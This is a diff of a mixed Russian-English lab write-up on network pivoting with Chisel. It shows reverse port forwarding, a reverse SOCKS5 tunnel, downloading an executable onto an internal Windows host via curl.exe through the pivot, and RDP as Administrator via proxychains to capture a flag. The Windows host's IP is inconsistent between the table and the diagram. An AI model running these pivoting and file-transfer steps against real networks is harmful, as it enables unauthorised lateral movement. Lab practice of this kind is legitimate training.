@@ -1,35 +1,39 @@
-# Network Pivoting Lab: Chisel
+# Network Pivoting Lab: Chisel, SOCKS5 Proxy, and RDP
+---
 
-Практическая лабораторная работа по изучению сетевого пивотинга с
-помощью **Chisel**. Сценарий моделирует ситуацию, в которой
-злоумышленник получил первоначальный доступ к Ubuntu-серверу сотрудника
-и использует его как промежуточный узел для доступа к внутренней сети.
+## Overview
 
-> **Статус:** документ охватывает первые два этапа. Неподтверждённые
-> результаты явно отмечены.
+This lab demonstrates several network pivoting techniques using **Chisel**.
 
+The main objective is to gain access to an internal network through a dual-homed Ubuntu machine acting as a pivot host.
+
+The lab covers:
+
+1. Reverse Port Forwarding
+2. Reverse SOCKS5 Proxy
+3. Transferring an executable file through the pivot host
+4. Accessing a Windows machine via RDP through a SOCKS5 tunnel
 ## 1. Архитектура лаборатории
-
-Лаборатория построена на виртуальных машинах в **KVM / virt-manager**.
-Ubuntu имеет два сетевых интерфейса и выполняет роль pivot host.
+The lab consists of three virtual machines in: **KVM / virt-manager**.
+Ubuntu has two network interfaces and acts as pivot host.
 
   -----------------------------------------------------------------------
   Машина                  Роль                    IP-адрес
   ----------------------- ----------------------- -----------------------
-  Kali Linux              Машина атакующего,      `192.168.122.59`
+  Kali Linux              Attacker machine,      `192.168.122.59`
                           Chisel Server           
 
-  Ubuntu-1                Первоначально           `192.168.122.153` и
+  Ubuntu-1                Originally              `192.168.122.153` and
                           скомпрометированный     `192.168.0.139`
-                          хост, Chisel Client /   
+                          host, Chisel Client /   
                           pivot                   
 
-  Windows                 Внутренний хост,        `192.168.0.59`
-                          будущая RDP-цель        
+  Windows                 Internal host,        `192.168.0.53`
+                          future RDP target        
   -----------------------------------------------------------------------
 
 ``` text
-Внешняя сеть: 192.168.122.0/24
+External network: 192.168.122.0/24
 
 Kali Linux                         Ubuntu-1
 192.168.122.59  <-------------->  192.168.122.153
@@ -37,14 +41,14 @@ Kali Linux                         Ubuntu-1
                                          |
                                     192.168.0.139
                                          |
-                              Внутренняя сеть: 192.168.0.0/24
+                              Internal network: 192.168.0.0/24
                                          |
                                       Windows
                                     192.168.0.59
 ```
 
-Kali не должна иметь прямого доступа к Windows. Для обращения к
-внутренним ресурсам используется Ubuntu как промежуточный узел.
+Kali should not have direct access to Windows. To access
+Internal resources are handled using Ubuntu as a proxy.
 
 ## 2. Сценарий
 
@@ -342,3 +346,78 @@ curl.exe http://192.168.0.139:8081/<имя_файла>.exe -o <имя_файла
 
 
 Запрос приходит на Ubuntu по внутренней сети. Chisel передаёт его на HTTP-сервер Kali, откуда Windows получает файл.
+
+
+### 5. Подключение к Windows по RDP
+
+На Kali запускаем FreeRDP через ProxyChains:
+
+```bash
+proxychains4 xfreerdp3 /v:192.168.0.53:3389 /u:Administrator
+```
+
+Пароль вводится интерактивно, если клиент запрашивает его. Не рекомендуется передавать пароль непосредственно через `/p:`, поскольку он может попасть в историю shell или список процессов.
+
+### Схема соединения
+
+```text
+Kali Linux
+FreeRDP
+   |
+   v
+ProxyChains
+   |
+   v
+127.0.0.1:1080
+SOCKS5 Listener
+   |
+   v
+Chisel Server (Kali)
+   |
+   | Reverse Tunnel
+   v
+Chisel Client (Ubuntu)
+   |
+   v
+Windows 192.168.0.53:3389
+RDP
+```
+
+### Результат
+
+**Флаг успешно получен:**
+
+```text
+FLAG{IMPROVE_YOU_PIVOTING}
+```
+
+После подключения к Windows по RDP через Reverse SOCKS5-туннель Chisel и ProxyChains был прочитан флаг.
+
+---
+
+# Технические выводы
+
+В ходе лабораторной работы были использованы:
+
+- **Chisel** — Reverse Port Forwarding и SOCKS5-туннелирование.
+- **Python HTTP Server** — передача файлов через HTTP.
+- **ProxyChains** — перенаправление TCP-соединений приложений через SOCKS5.
+- **FreeRDP** — подключение к Windows по RDP.
+- **Ubuntu** — промежуточный узел (Pivot Host) с двумя сетевыми интерфейсами.
+
+В ходе работы были изучены механизмы перенаправления портов и построения SOCKS5-туннеля через промежуточный узел.
+
+Ключевой момент: SOCKS5 listener `127.0.0.1:1080` расположен на Kali. Ubuntu инициирует Chisel-соединение с Kali, а запросы к внутренним ресурсам обрабатываются со стороны Ubuntu.
+
+---
+
+# Материалы для репозитория
+
+Рекомендуется добавить скриншоты, подтверждающие каждый этап:
+
+1. Chisel Server и Client для Phase 1.
+2. Сообщение Chisel о запуске SOCKS listener для Phase 2.
+3. Python HTTP Server, Chisel Client и успешную загрузку файла на Windows для Phase 3.
+4. Конфигурацию ProxyChains без секретов, подключение FreeRDP и полученный флаг для Phase 4.
+
+Перед публикацией необходимо проверить скриншоты и команды на отсутствие паролей, токенов, приватных ключей и других секретов.
